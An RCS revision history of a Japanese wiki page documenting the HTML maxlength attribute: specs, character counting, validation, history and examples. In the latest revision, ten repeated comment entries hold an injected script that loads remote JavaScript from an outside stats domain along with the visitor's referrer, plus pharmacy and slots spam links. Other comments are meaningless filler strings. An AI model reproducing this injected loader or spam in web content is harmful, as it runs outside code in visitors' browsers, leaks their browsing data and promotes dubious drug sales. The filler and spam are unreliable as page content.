head	1.10;
access;
symbols
	suikawiki3-final:1.10;
locks; strict;
comment	@# @;
expand	@o@;


1.10
date	2008.08.23.02.52.04;	author wakaba;	state Exp;
branches;
next	1.9;

1.9
date	2007.10.18.02.38.55;	author wakaba;	state Exp;
branches;
next	1.8;

1.8
date	2007.04.13.02.58.23;	author wakaba;	state Exp;
branches;
next	1.7;

1.7
date	2007.01.18.02.25.32;	author wakaba;	state Exp;
branches;
next	1.6;

1.6
date	2006.10.08.02.15.16;	author wakaba;	state Exp;
branches;
next	1.5;

1.5
date	2006.09.08.02.15.37;	author wakaba;	state Exp;
branches;
next	1.4;

1.4
date	2006.07.23.02.12.29;	author wakaba;	state Exp;
branches;
next	1.3;

1.3
date	2006.03.31.02.11.09;	author wakaba;	state Exp;
branches;
next	1.2;

1.2
date	2005.03.08.02.06.19;	author wakaba;	state Exp;
branches;
next	1.1;

1.1
date	2004.09.08.02.05.26;	author wakaba;	state Exp;
branches;
next	;


desc
@@


1.10
log
@auto-committed
@
text
@

* [CODE(HTMLa)@@en[maxlength]] 属性 (HTML)

[1] [[HTML]] の [CODE(HTMLe)[[[input]]]] [[要素]]と
[CODE(HTMLe)@@en[[[textarea]]]] [[要素]]の
[DFN[[CODE(HTMLa)[maxlength]] 属性]]は、
利用者が入力できる最大文字数を指定します。

[9]
:状態:[[W3C]] [[勧告]]、[[WHATWG]] [[WD]]
:[[要素型]]:
[CODE(HTMLe)@@en[[[input]]]]、[CODE(HTMLe)@@en[[[textarea]]]]
:[CODE(DOMa)@@en[[[type]]]]:
[CODE(HTML)@@en[[[text]]]]、
[CODE(HTML)@@en[[[password]]]]、
[CODE(HTML)@@en[[[email]]]]、
[CODE(HTML)@@en[[[url]]]]、
[CODE(HTMLe)@@en[[[textarea]]]]
:[[属性名]]:[CODE(HTMLa)@@en[[[maxlength]]]]
([Q@@en[maximum length]] ([Q[最大長]]) より)
:[[属性値]]:[[文字数]] (>>3)
:[[既定値]]:制限なし (>>4)

[2] 仕様書:
- [[HTML 4]]
-- [CODE(HTMLe)[input]] 要素 [CODE(HTMLa)[maxlength]] 属性
<IW:HTML4:"interact/forms.html#adef-maxlength">
- [[Web Forms 2.0]]
-- [CSECTION@@en[2.5. Extensions to existing attributes]]
<IW:WF2:"#extensions0">


** 属性値

[3] この属性の値は [CODE(SGML)[[[NUMBER]]]] です。
最大の文字数を指定します。

[4] この属性は省略可能です。省略時は無制限と見なされます。 [SRC[HTML 4 17.4]]

[19]
123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890223456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890323456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890423456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890523456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890623456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890723456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890823456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890923456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890023456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890112345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789END

([[aaa]] [aaaa] [WEAK[2007-01-17 05:06:31 +00:00]])

[20]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[21]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[22]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[23]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[24]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[25]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[26]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[27]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[28]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[29]
p15asfe-e83llpg-tw6q243c-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#1 
<a href="http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#2">buy xanax</a> 
[url=http://www.kina.org/topic.asp?TOPIC_ID=255&FORUM_ID=2&CAT_ID=2&Topic_Title=%3A%3A+VIAGRA+%3A%3A+buy+viagra+online%2E+Cheap+viagra+witho&Forum_Title=Allt+om+Kina#3]viagra online[/url] 
[url]http://www.basicskillsresources.org.uk/topic.asp?TOPIC_ID=63&FORUM_ID=1&CAT_ID=1&Topic_Title=%3A%3A+XANAX+%3A%3A+buy+xanax+online%2E+Cheap+xanax+without&Forum_Title=General+Chat#4[/url]
([[online slots]] [d97s_test860@@hotmail.com])

[[#comment]]


** 数え方

[12]
[CODE(HTMLa)@@en[[[maxlength]]]] [[属性]]の値は、
[[文字]]の[[数]] ([[符号位置]]の[[数]])
を制約します。
[SRC@@en[WF2 2.5]]

[13] 
[CODE(HTMLe)@@en[[[textarea]]]] では、
[[改行]]は、 [CODE(HTMLa)@@en[[[wrap]]]]
[[属性]]の[[値]]に依存して追加されるものも含め、
1つ2[[文字]] ([CODE(charname)@@en[[[CR]]]]
[CODE(charname)@@en[[[LF]]]]) と数えます。
[SRC@@en[WF2 2.5、2.14]]

[17]
この[[属性]]は[[初期値]] ([CODE(DOMa)@@en[[[defaultValue]]]])
には影響[['''してはなりません''']]。
[[利用者]]の入力や[[妥当性検証]]にのみ影響[['''しなければなりません''']]。
[SRC@@en[WF2 2.5]]


[31]
あああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああああ
([[名無しさん]] [WEAK[2008-08-19 06:34:04 +00:00]])


[[#comment]]


** 安全性

[16]
[[フォーム処理エージェント]]は、
悪意の有る[[利用者]]や[[不適合]]の[[利用者エージェント]]を考慮し、
[CODE(HTMLa)@@en[[[maxlength]]]] [[属性]]が指定されていたとしても、
必要ならば入力値の長さの検査を[['''するべきです''']]。
[SRC@@en[WF2 2.5]]

[[#comment]]


** 歴史

[6]
HTML 4 DTD の[[注釈]] (参考) には
[Q[max chars for text fields]]
と説明があります。

[10]
[CODE(HTMLa)@@en[[[maxlength]]]] [[属性]]は、
[[HTML 4]] では [CODE(HTMLe)@@en[[[input]]]]
[[要素]]の [CODE(HTML)@@en[[[text]]]] と
[CODE(HTML)@@en[[[password]]]] にだけ定義されていました。

[11]
[[Web Forms 2.0]] では、
[CODE(HTMLe)@@en[[[input]]]] の
[CODE(HTML)@@en[[[email]]]] と
[CODE(HTML)@@en[[[url]]]]
にも適用されるようになりました。
また、 [CODE(HTMLe)@@en[[[textarea]]]]
にも定義されました。

[30]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas
ssssssssssssssssss
([[名無しさん]] [WEAK[2007-10-17 04:07:56 +00:00]])

[[#comment]]


** 実装

[8]
[CITE[Bug 345267 - If the initial text input value is longer than maxlength it is truncated.]] <https://bugzilla.mozilla.org/show_bug.cgi?id=345267>
([[名無しさん]] [WEAK[2006-07-22 04:28:31 +00:00]])

[[#comment]]


** 関連

[5] この属性の値は、 [CODE(HTMLa)[[[size]]]] 属性の値を超えても構いません。
その場合は、 UA は何らかの scroll の仕組みを用意するべきです。
[SRC[HTML 4 17.4]]

[15]
[CODE(HTMLa)@@en[[[maxlength]]]] が
[CODE(HTML)@@en[[[text]]]], [CODE(HTML)@@en[[[password]]]],
[CODE(HTML)@@en[[[email]]]], [CODE(HTML)@@en[[[url]]]],
[CODE(HTMLe)@@en[[[textarea]]]]
に対して与えられ、その[[制御子]]が指定された[[数]]よりも多くの[[符号位置]]を含み、
''しかもその[[値]]が[[既定値]]とは[[一致]]しない''なら、
[CODE(DOM)@@en[[[tooLong]]]] [[妥当性検証誤り]]が[[報告]]されます。
[SRC@@en[WF2 2.5]]

[[#comment]]


** 例

[18]
[PRE(HTML example code)[
<input type="email" maxlength="1" name="test"/>
]PRE]

この[[制御子]]は、[[値が選択されていない]]ときだけ[[妥当]]になります。
[SRC@@en[WF2 2.5]]

;; 長さが1の[[電子メイル・アドレス]]は存在しないからです。

[[#comment]]


** メモ

[7]
[[正規化]]や[[提出]]時の[[文字コード]]の変換によって、
同じ[[文字列]]のはずでも長さが変わって[CODE(HTMLa)@@en[[[maxlength]]]]の制限を満たさなくなることがあります。

[14]
[CODE(HTML)@@en[[[email]]]] や
[CODE(HTML)@@en[[[url]]]]
で [CODE(HTMLa)@@en[[[maxlength]]]]
[[属性]]を使うことは、
実際に[[フォーム処理エージェント]]で制限がある場合を除き、
[[非推奨]]とされています。
[[電子メイル・アドレス]]や [[URI]]
は[[著者]]の考える以上に長いことがざらにあるからです。
[SRC@@en[WF2 2.5]]

[[#comment]]


* メモ@


1.9
log
@auto-committed
@
text
@d141 6
a183 1

d185 1
a185 1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas
a187 1

@


1.8
log
@auto-committed
@
text
@a108 1

a115 1

d177 7
@


1.7
log
@auto-committed
@
text
@a40 1

d42 1
a42 1
123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890223456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890323456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890423456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890523456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890623456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890723456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890823456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890923456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890023456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890112345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789END
d45 71
@


1.6
log
@auto-committed
@
text
@d1 175
a175 160
* [CODE(HTMLa)@@en[maxlength]] 属性 (HTML)

[1] [[HTML]] の [CODE(HTMLe)[[[input]]]] [[要素]]と
[CODE(HTMLe)@@en[[[textarea]]]] [[要素]]の
[DFN[[CODE(HTMLa)[maxlength]] 属性]]は、
利用者が入力できる最大文字数を指定します。

[9]
:状態:[[W3C]] [[勧告]]、[[WHATWG]] [[WD]]
:[[要素型]]:
[CODE(HTMLe)@@en[[[input]]]]、[CODE(HTMLe)@@en[[[textarea]]]]
:[CODE(DOMa)@@en[[[type]]]]:
[CODE(HTML)@@en[[[text]]]]、
[CODE(HTML)@@en[[[password]]]]、
[CODE(HTML)@@en[[[email]]]]、
[CODE(HTML)@@en[[[url]]]]、
[CODE(HTMLe)@@en[[[textarea]]]]
:[[属性名]]:[CODE(HTMLa)@@en[[[maxlength]]]]
([Q@@en[maximum length]] ([Q[最大長]]) より)
:[[属性値]]:[[文字数]] (>>3)
:[[既定値]]:制限なし (>>4)

[2] 仕様書:
- [[HTML 4]]
-- [CODE(HTMLe)[input]] 要素 [CODE(HTMLa)[maxlength]] 属性
<IW:HTML4:"interact/forms.html#adef-maxlength">
- [[Web Forms 2.0]]
-- [CSECTION@@en[2.5. Extensions to existing attributes]]
<IW:WF2:"#extensions0">



** 属性値

[3] この属性の値は [CODE(SGML)[[[NUMBER]]]] です。
最大の文字数を指定します。

[4] この属性は省略可能です。省略時は無制限と見なされます。 [SRC[HTML 4 17.4]]

[[#comment]]

** 数え方

[12]
[CODE(HTMLa)@@en[[[maxlength]]]] [[属性]]の値は、
[[文字]]の[[数]] ([[符号位置]]の[[数]])
を制約します。
[SRC@@en[WF2 2.5]]

[13] 
[CODE(HTMLe)@@en[[[textarea]]]] では、
[[改行]]は、 [CODE(HTMLa)@@en[[[wrap]]]]
[[属性]]の[[値]]に依存して追加されるものも含め、
1つ2[[文字]] ([CODE(charname)@@en[[[CR]]]]
[CODE(charname)@@en[[[LF]]]]) と数えます。
[SRC@@en[WF2 2.5、2.14]]

[17]
この[[属性]]は[[初期値]] ([CODE(DOMa)@@en[[[defaultValue]]]])
には影響[['''してはなりません''']]。
[[利用者]]の入力や[[妥当性検証]]にのみ影響[['''しなければなりません''']]。
[SRC@@en[WF2 2.5]]

[[#comment]]

** 安全性

[16]
[[フォーム処理エージェント]]は、
悪意の有る[[利用者]]や[[不適合]]の[[利用者エージェント]]を考慮し、
[CODE(HTMLa)@@en[[[maxlength]]]] [[属性]]が指定されていたとしても、
必要ならば入力値の長さの検査を[['''するべきです''']]。
[SRC@@en[WF2 2.5]]

[[#comment]]

** 歴史

[6]
HTML 4 DTD の[[注釈]] (参考) には
[Q[max chars for text fields]]
と説明があります。

[10]
[CODE(HTMLa)@@en[[[maxlength]]]] [[属性]]は、
[[HTML 4]] では [CODE(HTMLe)@@en[[[input]]]]
[[要素]]の [CODE(HTML)@@en[[[text]]]] と
[CODE(HTML)@@en[[[password]]]] にだけ定義されていました。

[11]
[[Web Forms 2.0]] では、
[CODE(HTMLe)@@en[[[input]]]] の
[CODE(HTML)@@en[[[email]]]] と
[CODE(HTML)@@en[[[url]]]]
にも適用されるようになりました。
また、 [CODE(HTMLe)@@en[[[textarea]]]]
にも定義されました。

[[#comment]]

** 実装

[8]
[CITE[Bug 345267 - If the initial text input value is longer than maxlength it is truncated.]] <https://bugzilla.mozilla.org/show_bug.cgi?id=345267>
([[名無しさん]] [WEAK[2006-07-22 04:28:31 +00:00]])

[[#comment]]

** 関連

[5] この属性の値は、 [CODE(HTMLa)[[[size]]]] 属性の値を超えても構いません。
その場合は、 UA は何らかの scroll の仕組みを用意するべきです。
[SRC[HTML 4 17.4]]

[15]
[CODE(HTMLa)@@en[[[maxlength]]]] が
[CODE(HTML)@@en[[[text]]]], [CODE(HTML)@@en[[[password]]]],
[CODE(HTML)@@en[[[email]]]], [CODE(HTML)@@en[[[url]]]],
[CODE(HTMLe)@@en[[[textarea]]]]
に対して与えられ、その[[制御子]]が指定された[[数]]よりも多くの[[符号位置]]を含み、
''しかもその[[値]]が[[既定値]]とは[[一致]]しない''なら、
[CODE(DOM)@@en[[[tooLong]]]] [[妥当性検証誤り]]が[[報告]]されます。
[SRC@@en[WF2 2.5]]

[[#comment]]

** 例

[18]
[PRE(HTML example code)[
<input type="email" maxlength="1" name="test"/>
]PRE]

この[[制御子]]は、[[値が選択されていない]]ときだけ[[妥当]]になります。
[SRC@@en[WF2 2.5]]

;; 長さが1の[[電子メイル・アドレス]]は存在しないからです。

[[#comment]]

** メモ

[7]
[[正規化]]や[[提出]]時の[[文字コード]]の変換によって、
同じ[[文字列]]のはずでも長さが変わって[CODE(HTMLa)@@en[[[maxlength]]]]の制限を満たさなくなることがあります。

[14]
[CODE(HTML)@@en[[[email]]]] や
[CODE(HTML)@@en[[[url]]]]
で [CODE(HTMLa)@@en[[[maxlength]]]]
[[属性]]を使うことは、
実際に[[フォーム処理エージェント]]で制限がある場合を除き、
[[非推奨]]とされています。
[[電子メイル・アドレス]]や [[URI]]
は[[著者]]の考える以上に長いことがざらにあるからです。
[SRC@@en[WF2 2.5]]

[[#comment]]


@


1.5
log
@auto-committed
@
text
@d56 1
a56 1
[SRC@@en[WF2 2.5]]
@


1.4
log
@auto-committed
@
text
@d1 160
a160 59


* input 要素 maxlength 属性 (HTML, XHTML 1)

[1] [[HTML]] の [CODE(HTMLe)[[[input]]]] 要素の
[DFN[[CODE(HTMLa)[maxlength]] 属性]]は、
利用者が入力できる最大文字数を指定します。

[CODE(HTMLa)[[[type]]]] 属性の値が [CODE(HTML)[[[text]]]]
または [CODE(HTML)[[[password]]]] の時に使えます。

[2] 仕様書:
- [[HTML 4]]
-- [CODE(HTMLe)[input]] 要素 [CODE(HTMLa)[maxlength]] 属性
<IW:HTML4:"interact/forms.html#adef-maxlength">

[6]
HTML 4 DTD の[[注釈]] (参考) には
[Q[max chars for text fields]]
と説明があります。
([[名無しさん]] [sage])

[[#comment]]


** 属性値

[3] この属性の値は [CODE(SGML)[[[NUMBER]]]] です。
最大の文字数を指定します。

[4] この属性は省略可能です。省略時は無制限と見なされます。 [SRC[HTML 4 17.4]]

[[#comment]]


** 他との関係

[5] この属性の値は、 [CODE(HTMLa)[[[size]]]] 属性の値を超えても構いません。
その場合は、 UA は何らかの scroll の仕組みを用意するべきです。
[SRC[HTML 4 17.4]]

[7]
[[正規化]]や[[提出]]時の[[文字コード]]の変換によって、
同じ[[文字列]]のはずでも長さが変わって[CODE(HTMLa)@@en[[[maxlength]]]]の制限を満たさなくなることがあります。
([[名無しさん]] [sage])

[[#comment]]


** メモ

[8]
[CITE[Bug 345267 - If the initial text input value is longer than maxlength it is truncated.]] <https://bugzilla.mozilla.org/show_bug.cgi?id=345267>
([[名無しさん]] [WEAK[2006-07-22 04:28:31 +00:00]])


[[#comment]]


@


1.3
log
@auto-committed
@
text
@a41 1

d43 1
a43 1
[[正規化]]や[[提出]]時の[[文字コード]]の変換によって、
a46 1

d51 5
@


1.2
log
@auto-committed
@
text
@a2 1

a16 1

d18 2
a19 2
HTML 4 DTD の[[注釈]] (参考) には
[Q[max chars for text fields]]
a22 1

d41 7
@


1.1
log
@auto-committed
@
text
@d1 52
a52 37
* input 要素 maxlength 属性 (HTML, XHTML 1)

[1] [[HTML]] の [CODE(HTMLe)[[[input]]]] 要素の
[DFN[[CODE(HTMLa)[maxlength]] 属性]]は、
利用者が入力できる最大文字数を指定します。

[CODE(HTMLa)[[[type]]]] 属性の値が [CODE(HTML)[[[text]]]]
または [CODE(HTML)[[[password]]]] の時に使えます。

[2] 仕様書:
- [[HTML 4]]
-- [CODE(HTMLe)[input]] 要素 [CODE(HTMLa)[maxlength]] 属性
<IW:HTML4:"interact/forms.html#adef-maxlength">

[[#comment]]

** 属性値

[3] この属性の値は [CODE(SGML)[[[NUMBER]]]] です。
最大の文字数を指定します。

[4] この属性は省略可能です。省略時は無制限と見なされます。 [SRC[HTML 4 17.4]]

[[#comment]]

** 他との関係

[5] この属性の値は、 [CODE(HTMLa)[[[size]]]] 属性の値を超えても構いません。
その場合は、 UA は何らかの scroll の仕組みを用意するべきです。
[SRC[HTML 4 17.4]]

[[#comment]]

** メモ

[[#comment]]

@

